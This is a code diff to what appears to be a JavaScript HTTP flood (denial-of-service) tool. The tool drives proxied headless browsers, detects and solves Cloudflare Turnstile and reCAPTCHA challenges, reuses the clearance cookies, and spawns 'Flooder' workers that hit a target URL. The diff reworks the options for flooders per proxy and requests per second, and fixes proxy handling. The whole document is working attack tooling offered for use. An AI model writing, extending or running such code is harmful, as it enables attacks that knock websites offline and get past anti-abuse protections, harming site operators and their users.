@@ -54,28 +54,28 @@ const BROWSER_CONFIG = {
       process.argv.find((arg) => arg.startsWith("--browsers="))?.split("=")[1]
     ) ||
     5,
-  requests:
+  floodersPerProxy:
     /**
      * * Used in Captcha.js to set max concurrent workers for the Flooder running per browser
+     */
+    parseInt(
+      process.argv
+        .find((arg) => arg.startsWith("--flooders-per-proxy="))
+        ?.split("=")[1]
+    ) ||
+    parseInt(
+      process.argv.find((arg) => arg.startsWith("-fpp="))?.split("=")[1]
+    ) ||
+    1,
+  rps:
+    /*
+     * ! Used in Flooder.js to set max concurrent proxy connections per thread
      */
     parseInt(
       process.argv.find((arg) => arg.startsWith("--requests="))?.split("=")[1]
     ) ||
     parseInt(
       process.argv.find((arg) => arg.startsWith("-rps="))?.split("=")[1]
-    ) ||
-    1,
-  cpspp:
-    /*
-     * ! Used in Flooder.js to set max concurrent proxy connections per thread
-     */
-    parseInt(
-      process.argv
-        .find((arg) => arg.startsWith("--cps-per-proxy="))
-        ?.split("=")[1]
-    ) ||
-    parseInt(
-      process.argv.find((arg) => arg.startsWith("-cpspp="))?.split("=")[1]
     ) ||
     10,
   runtime:
@@ -166,14 +166,14 @@ for (let i = 0; i < args.length; i++) {
       BROWSER_CONFIG.browserCount = parseInt(args[i + 1]);
       i++;
       break;
-    case "--requests":
-    case "-rps":
-      BROWSER_CONFIG.requests = parseInt(args[i + 1]);
+    case "--flooders-per-proxy":
+    case "-fpp":
+      BROWSER_CONFIG.floodersPerProxy = parseInt(args[i + 1]);
       i++;
       break;
-    case "--cps-per-proxy":
-    case "-cpspp":
-      BROWSER_CONFIG.cpspp = parseInt(args[i + 1]);
+    case "--requests":
+    case "-rps":
+      BROWSER_CONFIG.rps = parseInt(args[i + 1]);
       i++;
       break;
     case "--time":
@@ -237,9 +237,8 @@ Optional Options:
   -fp, --filter-proxies <true|false>  Filter non working proxies (default: false)
   -port, --targetPort <port>  Target port if not standard, only relevant for Flooder (default: 80/443)
   -pt, --proxy-timeout <ms>  Proxy connection timeout in milliseconds (default: 8000) Notice: Only set this, if --filter-proxies or -fp is set to true!
-  -rps, --requests <num>   Requests per second (default: 1)
-  -cpspp, --cps-per-proxy <num>  Max concurrent proxy
-                          connections per thread (default: 10)
+  -fpp, --flooders-per-proxy <num> Amount of Flooders started per Browser [fpp * rps == totalRequestsPerProxy] (default: 1)
+  -rps, --requests <num>  Requests each proxy tries within one Flooder thread (default: 10)
   -wt, --waitTime <min:max> Time to wait between flooding and solving process
   -time, --runtime <seconds>  Total runtime in seconds (default: 120)
   -cookie, --cookie-value <cookiename:cookievalue>  Set a custom cookie, incase needed [Only applies for non-reCaptcha /- non-CloudFlare targets, as those have fixed cookie-/value pairs e.g. cf_clearance] (default: "cookie:cookie_value")
@@ -433,7 +432,7 @@ async function setupBrowser(targetUrl, browserId, browsers, proxies) {
    * ! Set the selected information in the Browser Object to store it for later:
    */
   let browserData = null;
-  if (browserId < proxies.length) {
+  if (proxyIndex >= 0 && proxyIndex < proxies.length) {
     browserData = new BrowserObject(
       browserId,
       targetUrl,
@@ -442,9 +441,6 @@ async function setupBrowser(targetUrl, browserId, browsers, proxies) {
       proxies[proxyIndex].host,
       proxies[proxyIndex].port,
       BROWSER_CONFIG
-      /**
-       * * CookieObject is added later on using the set method within its class.
-       */
     );
   }
 
@@ -514,6 +510,8 @@ async function setupBrowser(targetUrl, browserId, browsers, proxies) {
     const { hasTurnstile, hasRecaptcha, unknownCaptcha } =
       await detectChallenges(page);
 
+    browserData.setPage(page);
+
     if (hasRecaptcha) {
       return await solveRecaptcha(
         page,
@@ -543,7 +541,7 @@ async function setupBrowser(targetUrl, browserId, browsers, proxies) {
   } catch (error) {
     log(
       "ERROR",
-      `Browser ${browserId}: Unable to create proxy tunnel: ${error.message}`
+      `Browser ${browserId}: Unable to create proxy tunnel: ${error}`
     );
     if (browser) {
       try {
@@ -559,14 +557,6 @@ async function setupProxy() {
    * Proxies
    */
   const proxiesArr = readFile(BROWSER_CONFIG.proxyFile);
-
-  /**
-   * TODO: Implement logic, so that proxies receive a member variable, that determines:
-   * * - Threat score / AbuseDB
-   * * - Speed (if possible)
-   *
-   * TODO: Implement logic, that lets the user sort the proxies based on abuseDB score / ms
-   */
 
   let proxies = [];
   if (BROWSER_CONFIG.filterProxies) {
@@ -652,9 +642,9 @@ async function startBrowsers(targetUrl, browserCount = 10) {
       /**
        * ? For every promise in the results array, give one browserData object to the flooder.
        */
-      for (let i = 0; i < BROWSER_CONFIG.requests; i++) {
+      for (let i = 0; i < BROWSER_CONFIG.floodersPerProxy; i++) {
         const httpRequest = new Flooder(browserData);
-        const instance = httpRequest.start();
+        const instance = httpRequest.start(browserData.page, i);
         flooderPromises.push(instance);
       }
     }
